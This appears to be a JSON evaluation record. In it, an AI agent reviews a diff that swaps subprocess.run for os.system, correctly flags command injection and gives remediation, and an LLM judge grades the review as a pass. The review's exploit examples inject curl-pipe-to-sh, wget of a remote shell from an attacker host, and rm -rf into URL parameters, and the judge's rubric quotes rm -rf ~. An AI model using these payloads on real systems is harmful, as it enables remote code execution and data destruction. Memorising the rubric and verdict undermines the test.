@@ -1,0 +1,53 @@
+{
+  "caseId": "obfuscated-cmdi",
+  "rep": 6,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-obfuscated-cmdi.patch"
+  ],
+  "output": "## Security Review: `diff-obfuscated-cmdi.patch`\n\n### Critical: Command Injection via `os.system` (CWE-78)\n\n**File:** `src/media/thumbnail.py:14`\n\nThe change replaces a safe `subprocess.run([...])` call with `os.system(\" \".join(parts))`:\n\n```python\ninfile = request.GET.get(\"src\", \"input.png\")      # attacker-controlled\nsize   = request.GET.get(\"size\", \"100x100\")       # attacker-controlled\noutfile = \"thumb.png\"\nparts = [\"convert\", infile, \"-resize\", size, outfile]\nos.system(\" \".join(parts))                          # ← shell invocation\n```\n\n**Why the original was safe:** `subprocess.run([\"convert\", infile, ...])` passes arguments as a list directly to `execve` — **no shell is involved**, so shell metacharacters in `infile`/`size` are treated as literal filename/argument bytes.\n\n**Why the new code is vulnerable:** `os.system()` runs its string argument through `/bin/sh -c`. Both `infile` and `size` flow directly from HTTP request parameters into that string with no quoting or validation. Any shell metacharacter (`;`, `|`, `&`, `$()`, backticks, `>`) breaks out of the intended command.\n\n**Exploit examples:**\n- `?src=x;curl%20evil.sh|sh` → `convert x;curl evil.sh|sh -resize ...` → arbitrary RCE\n- `?size=100x100;rm%20-rf%20/tmp/*` → destructive command execution\n- `?src=$(whoami)` → command substitution\n- `?src=x;wget%20http://attacker/shell%20-O%20/tmp/s` → remote payload drop\n\nThis is unauthenticated remote code execution running with the web server's privileges.\n\n### The obfuscation\n\nTwo details disguise the vulnerability rather than fix it:\n\n1. **`import shlex` was added but never used.** It signals an *intent* to sanitize (via `shlex.quote`) that is never carried out — a decoy suggesting the code is safe when it isn't.\n2. **The argument list is still built as a `parts` list**, visually resembling the safe `subprocess` list-form, but it is then flattened with `\" \".join(...)` and handed to a shell — defeating the entire safety property of list-form execution.\n\n### Remediation\n\nRevert to list-form `subprocess` (no shell):\n\n```python\nsubprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)\n```\n\nAdditionally (defense in depth), since `infile`/`size` are user input even without a shell:\n- Validate `size` against `^\\d+x\\d+$`.\n- Constrain `src` to an allowlisted directory / basename (prevent path traversal and passing `convert` options like `-write`).\n- Never reintroduce `os.system` / `shell=True` with request-derived data. If a shell string is ever unavoidable, `shlex.quote` **each** interpolated value (that's presumably what the unused `import shlex` was meant for).\n\n**Verdict:** This diff introduces a critical, likely unauthenticated, command-injection → RCE regression. It should not be merged.",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-18T23:59:42.742Z",
+  "durationMs": 37932,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the core vulnerability — user-controlled `src` and `size` from request.GET flowing into `os.system(\" \".join(parts))`, causing OS command/shell injection — and explained precisely why the prior `subprocess.run([...])` form was safe while the new shell-joined string is not, including concrete exploit payloads and remediation. This matches the rubric's required finding exactly.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the core vulnerability — user-controlled `src` and `size` from request.GET flowing into `os.system(\" \".join(parts))`, causing OS command/shell injection — and explained precisely why the prior `subprocess.run([...])` form was safe while the new shell-joined string is not, including concrete exploit payloads and remediation. This matches the rubric's required finding exactly."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the core vulnerability — user-controlled `src` and `size` from request.GET flowing into `os.system(\" \".join(parts))`, resulting in shell command injection/RCE — and correctly explained why the prior `subprocess.run([...])` list-form was safe while the new joined-string-to-os.system pattern is not, including concrete exploit examples and remediation. This matches the rubric's required finding precisely.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the core vulnerability — user-controlled `src` and `size` from request.GET flowing into `os.system(\" \".join(parts))`, resulting in shell command injection/RCE — and correctly explained why the prior `subprocess.run([...])` list-form was safe while the new joined-string-to-os.system pattern is not, including concrete exploit examples and remediation. This matches the rubric's required finding precisely."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe diff introduces an OS command injection vulnerability: user-controlled `size`/`src` from request.GET are collected into a `parts` list that is then joined into a single shell string with `' '.join(parts)` and passed to `os.system(...)`, allowing arbitrary shell command execution (e.g. size='100x100; rm -rf ~'). The previous code used a safe `subprocess.run([...])` argument vector. PASS only if the review identifies this as a real command/shell injection vulnerability caused by user input reaching `os.system`; FAIL if it misses it, concludes the code is safe (e.g. mistakes `parts` for a safe argument vector), or only comments on style or the unused `shlex` import.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n## Security Review: `diff-obfuscated-cmdi.patch`\n\n### Critical: Command Injection via `os.system` (CWE-78)\n\n**File:** `src/media/thumbnail.py:14`\n\nThe change replaces a safe `subprocess.run([...])` call with `os.system(\" \".join(parts))`:\n\n```python\ninfile = request.GET.get(\"src\", \"input.png\")      # attacker-controlled\nsize   = request.GET.get(\"size\", \"100x100\")       # attacker-controlled\noutfile = \"thumb.png\"\nparts = [\"convert\", infile, \"-resize\", size, outfile]\nos.system(\" \".join(parts))                          # ← shell invocation\n```\n\n**Why the original was safe:** `subprocess.run([\"convert\", infile, ...])` passes arguments as a list directly to `execve` — **no shell is involved**, so shell metacharacters in `infile`/`size` are treated as literal filename/argument bytes.\n\n**Why the new code is vulnerable:** `os.system()` runs its string argument through `/bin/sh -c`. Both `infile` and `size` flow directly from HTTP request parameters into that string with no quoting or validation. Any shell metacharacter (`;`, `|`, `&`, `$()`, backticks, `>`) breaks out of the intended command.\n\n**Exploit examples:**\n- `?src=x;curl%20evil.sh|sh` → `convert x;curl evil.sh|sh -resize ...` → arbitrary RCE\n- `?size=100x100;rm%20-rf%20/tmp/*` → destructive command execution\n- `?src=$(whoami)` → command substitution\n- `?src=x;wget%20http://attacker/shell%20-O%20/tmp/s` → remote payload drop\n\nThis is unauthenticated remote code execution running with the web server's privileges.\n\n### The obfuscation\n\nTwo details disguise the vulnerability rather than fix it:\n\n1. **`import shlex` was added but never used.** It signals an *intent* to sanitize (via `shlex.quote`) that is never carried out — a decoy suggesting the code is safe when it isn't.\n2. **The argument list is still built as a `parts` list**, visually resembling the safe `subprocess` list-form, but it is then flattened with `\" \".join(...)` and handed to a shell — defeating the entire safety property of list-form execution.\n\n### Remediation\n\nRevert to list-form `subprocess` (no shell):\n\n```python\nsubprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)\n```\n\nAdditionally (defense in depth), since `infile`/`size` are user input even without a shell:\n- Validate `size` against `^\\d+x\\d+$`.\n- Constrain `src` to an allowlisted directory / basename (prevent path traversal and passing `convert` options like `-write`).\n- Never reintroduce `os.system` / `shell=True` with request-derived data. If a shell string is ever unavoidable, `shlex.quote` **each** interpolated value (that's presumably what the unused `import shlex` was meant for).\n\n**Verdict:** This diff introduces a critical, likely unauthenticated, command-injection → RCE regression. It should not be merged.\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "transcript": {
+    "command": "claude",
+    "args": [
+      "-p",
+      "Review this diff for security issues and report your findings. Read the file 'diff-obfuscated-cmdi.patch' in your current working directory, then review it.",
+      "--allowedTools",
+      "Read Grep Glob",
+      "--strict-mcp-config",
+      "--model",
+      "claude-opus-4-8"
+    ],
+    "exitCode": 0,
+    "timedOut": false,
+    "stderr": "Warning: no stdin data received in 3s, proceeding without it. If piping from a slow command, redirect stdin explicitly: < /dev/null to skip, or wait longer."
+  }
+}
